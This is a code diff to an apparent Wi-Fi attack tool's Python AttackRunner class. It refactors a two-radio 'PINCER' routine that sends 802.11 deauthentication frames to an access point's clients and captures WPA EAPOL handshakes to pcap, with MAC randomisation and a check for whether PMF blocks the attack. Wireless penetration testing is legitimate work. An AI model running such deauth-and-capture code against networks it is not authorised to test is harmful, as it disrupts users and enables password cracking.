@@ -64,9 +64,11 @@ class AttackRunner:
     def _pmf_block_message(self, ap) -> str | None:
         """None if deauth is worth attempting against ap, else the reason
         it isn't -- same `secure.recommend_attack()` call run_smart() uses,
-        so every deauth entry point (manual buttons included, 2026-08-30)
-        gives the identical PMF-aware verdict instead of each one silently
-        sending frames the 2026-08-30 hwsim test proved have zero effect."""
+        so the deauth_all/deauth_client manual buttons (2026-08-30) give
+        the identical PMF-aware verdict instead of silently sending frames
+        the 2026-08-30 hwsim test proved have zero effect. pincer() does
+        its own separate, simpler PMF check (skip the whole flow rather
+        than a per-call verdict) instead of calling this."""
         if ap.pmf != "required":
             return None
         from ..secure import recommend_attack
@@ -353,8 +355,8 @@ class AttackRunner:
     def pincer(self, ap, scan_iface: str, attack_iface: str, randomize_mac: bool,
                watch_capture_fn: Callable[[str, threading.Event], None]) -> str:
         from ..attacks.deauth import deauth
-        from ..attacks.handshake import HandshakeStatus, capture_handshake
-        from ..frames import BROADCAST
+        from ..attacks.handshake import HandshakeCapture, HandshakeStatus, capture_handshake
+        from ..attacks.logic import best_status, run_deauth_flow, select_client
         from ..radio import ensure_channel, get_mode, set_managed_mode, set_monitor_mode
         from ..storage import target_capture_dir
 
@@ -366,6 +368,9 @@ class AttackRunner:
         interval = 10
         out_dir = target_capture_dir(ap.ssid, ap.bssid)
         out_file = out_dir / f"pincer_{int(time.time())}.pcap"
+        # burst_size=64 keeps PINCER's existing frame count -- see
+        # attacks/logic.py; History.md, 2026-09-13.
+        cap = HandshakeCapture()
 
         self._log(f"PINCER: putting {scan_iface} (scan/listen) into monitor mode (randomize_mac={randomize_mac})")
         scan_mon, scan_perm_mac = set_monitor_mode(scan_iface, randomize_mac=randomize_mac)
@@ -381,13 +386,11 @@ class AttackRunner:
             else:
                 self._log("PINCER: no channel known for target — radios left on their current channel")
 
-            result: dict = {}
-
             def listen():
-                result["cap"] = capture_handshake(
+                capture_handshake(
                     scan_mon, ap.bssid, channel=ap.channel,
                     timeout=interval * max_rounds + 15, outfile=str(out_file),
-                    stop_event=self._stop_event, progress_fn=self._log,
+                    stop_event=self._stop_event, progress_fn=self._log, cap=cap,
                 )
 
             self._log(f"PINCER: {scan_mon} starting EAPOL listener, writing to {out_file}")
@@ -396,34 +399,13 @@ class AttackRunner:
             watch_stop = threading.Event()
             threading.Thread(target=watch_capture_fn, args=(str(out_file), watch_stop), daemon=True).start()
 
-            def authorized() -> bool:
-                cap = result.get("cap")
-                return bool(cap and any(cap.status(a, c) is HandshakeStatus.AUTHORIZED for a, c in cap.messages))
-
-            for round_n in range(max_rounds):
-                if self._stop_event.is_set():
-                    self._log(f"PINCER: stop requested before round {round_n + 1}/{max_rounds}")
-                    break
-                client = next(iter(ap.clients), BROADCAST)
-                sent = deauth(attack_mon, ap.bssid, client=client, channel=ap.channel, progress_fn=self._log)
-                if sent == 0:
-                    self._log(
-                        f"PINCER round {round_n + 1}/{max_rounds}: deauth did NOT go out "
-                        f"({attack_mon} -> {client}) — see the warning above"
-                    )
-                else:
-                    self._log(f"PINCER round {round_n + 1}/{max_rounds}: sent {sent} deauth frame(s) ({attack_mon} -> {client})")
-                cap = result.get("cap")
-                if cap is not None:
-                    statuses = {(a, c): cap.status(a, c).value for a, c in cap.messages}
-                    self._log(f"PINCER round {round_n + 1}/{max_rounds}: EAPOL pairs seen so far: {statuses!r}")
-                for _ in range(interval):
-                    if self._stop_event.is_set() or authorized():
-                        break
-                    time.sleep(1)
-                if authorized():
-                    self._log("PINCER: AUTHORIZED handshake detected — stopping deauth rounds")
-                    break
+            client = select_client(ap)
+            run_deauth_flow(
+                deauth, attack_mon, ap, client, cap,
+                max_rounds=max_rounds, round_interval=interval, burst_size=64,
+                min_status=HandshakeStatus.CHALLENGE,
+                stop_event=self._stop_event, progress_fn=self._log,
+            )
 
             listener.join(timeout=5)
             watch_stop.set()
@@ -433,6 +415,9 @@ class AttackRunner:
             set_managed_mode(attack_mon, restore_mac=attack_perm_mac)
             self._log("PINCER: both radios restored")
 
-        if authorized():
+        status = best_status(cap)
+        if status is HandshakeStatus.AUTHORIZED:
             return f"AUTHORIZED handshake captured -> {out_file}"
-        return "stopped or exhausted rounds, no AUTHORIZED handshake"
+        if status is HandshakeStatus.CHALLENGE:
+            return f"CHALLENGE handshake captured (unverified by AP) -> {out_file}"
+        return "stopped or exhausted rounds, no handshake material captured"
